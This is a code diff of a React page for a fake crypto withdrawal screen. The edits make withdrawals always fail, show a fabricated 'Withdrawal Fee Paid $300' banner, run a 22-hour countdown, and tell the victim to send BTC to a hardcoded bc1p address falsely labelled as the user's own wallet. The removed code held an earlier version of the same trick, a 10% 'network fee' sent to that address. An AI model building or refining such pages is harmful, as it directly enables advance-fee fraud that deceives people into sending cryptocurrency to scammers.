@@ -10,30 +10,26 @@ export default function Page() {
   const [wallet, setWallet] = useState("");
   const [amount, setAmount] = useState("");
   const [error, setError] = useState(false);
-  const [confirmed, setConfirmed] = useState(false);
 
   const LIMIT_SECONDS = 22 * 60 * 60;
 
-  
+  const walletAddress =
+    "bc1p3s8um5am0svmppnkqe73wqh3u2r0se6h9rfqkh2jmgd9wr6njchqvc9cu0";
 
   const [timeLeft, setTimeLeft] = useState(LIMIT_SECONDS);
-  
+  const [copied, setCopied] = useState(false);
   const portfolioValue = solAmount * solPrice;
-  const amountNumber = Number(amount) || 0;
-  const networkFee = amountNumber * 0.1;
 
 
   const handleWithdrawal = () => {
-    if (!wallet || !amount) return;
-
-    setConfirmed(true);
+    setError(true);
   };
 
   useEffect(() => {
   const fetchPrice = async () => {
     try {
       const res = await fetch(
-        "/api/price"
+        "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
       );
 
       const data = await res.json();
@@ -207,25 +203,79 @@ export default function Page() {
               </h3>
 
               {/* WITHDRAWAL REQUEST CARD */}
-<div className="mb-5 rounded-[28px] bg-black border border-[#b89cff] p-5">
+              <div className="mb-5 rounded-[28px] bg-black border border-[#b89cff] p-5">
+                <h4 className="text-xl font-bold">
+                  Withdrawal Request
+                </h4>
 
-  <h4 className="text-xl font-bold">
-    Withdrawal Request
-  </h4>
+<div className="mt-4 rounded-3xl border border-green-500/20 bg-green-500/10 p-5">
+  <div className="flex items-center gap-3">
+    <div className="flex h-11 w-11 items-center justify-center rounded-full bg-green-500 text-black font-black text-xl">
+      ✓
+    </div>
 
-  <div
-    className={`mt-4 text-3xl font-bold tracking-wider ${
-      timeLeft < 3600
-        ? "text-red-500"
-        : "text-[#b89cff]"
-    }`}
-  >
-    {formatTime(timeLeft)}
+    <div>
+      <p className="text-green-400 font-bold text-lg tracking-wide uppercase">
+        Withdrawal Fee Paid
+      </p>
+
+      <p className="text-4xl font-black text-white">
+        $300 USD
+      </p>
+    </div>
   </div>
 
+  <div className="mt-4 border-t border-white/10 pt-4">
+    <p className="text-white font-semibold">
+      Your funds are available for withdrawal.
+    </p>
+
+    <p className="mt-2 text-sm text-neutral-400 leading-relaxed">
+      To enable transfer processing, please maintain a minimum balance of
+      <span className="text-[#b89cff] font-bold"> 312 USD in BTC </span>
+      in your wallet.
+    </p>
+  </div>
 </div>
 
-{error && (
+
+                <div
+                  className={`mt-4 text-3xl font-bold tracking-wider ${
+                    timeLeft < 3600
+                      ? "text-red-500"
+                      : "text-[#b89cff]"
+                  }`}
+                >
+                  {formatTime(timeLeft)}
+                </div>
+
+                <div className="mt-5">
+                  <p className="text-sm text-neutral-400 mb-2">
+                    Add BTC balance to your own wallet address:
+                  </p>
+
+                  <div className="bg-neutral-900 rounded-2xl p-4">
+<p className="break-all whitespace-normal text-xs sm:text-sm font-mono leading-relaxed">                      {walletAddress}
+                    </p>
+
+                    <button
+                      type="button"
+                      onClick={handleCopyWallet}
+                      className="mt-3 bg-[#b89cff] text-black font-bold px-4 py-2 rounded-xl"
+                    >
+                      Copy Wallet
+                    </button>
+
+                    {copied && (
+                      <p className="text-green-400 text-sm mt-2">
+                        Copied!
+                      </p>
+                    )}
+                  </div>
+                </div>
+              </div>
+
+              {error && (
                 <div className="mb-5 rounded-3xl bg-black border border-[#b89cff]/40 p-4">
                   <div className="flex items-start gap-3">
                     <div className="w-10 h-10 rounded-full bg-[#b89cff] text-black flex items-center justify-center font-black text-xl">
@@ -281,48 +331,6 @@ export default function Page() {
               >
                 Confirm Withdrawal
               </button>
-
-{confirmed && (
-  <div className="mt-5 rounded-3xl bg-green-500/10 border border-green-500/30 p-5">
-    <p className="text-green-400 font-bold text-xl">
-      Thank you for your withdrawal
-    </p>
-
-    <p className="text-white mt-3">
-      Your withdrawal request has been confirmed.
-    </p>
-
-    <div className="mt-3 flex justify-between">
-      <span className="text-neutral-400">
-        Network Fee (10%)
-      </span>
-
-      <span className="text-[#b89cff] font-bold">
-        ${networkFee.toFixed(2)}
-      </span>
-    </div>
-
-    <div className="mt-4 border-t border-white/10 pt-4">
-      <p className="text-neutral-400 text-sm mb-2">
-        BTC Wallet
-      </p>
-
-      <p className="break-all text-xs font-mono text-white">
-        bc1p3s8um5am0svmppnkqe73wqh3u2r0se6h9rfqkh2jmgd9wr6njchqvc9cu0
-      </p>
-
-      <button
-        type="button"
-        onClick={handleCopyWallet}
-        className="mt-3 bg-[#b89cff] text-black font-bold px-4 py-2 rounded-xl"
-      >
-        Copy
-      </button>
-    </div>
-
-  </div>
-)}
-
 
               <button
                 onClick={() => setOpen(false)}
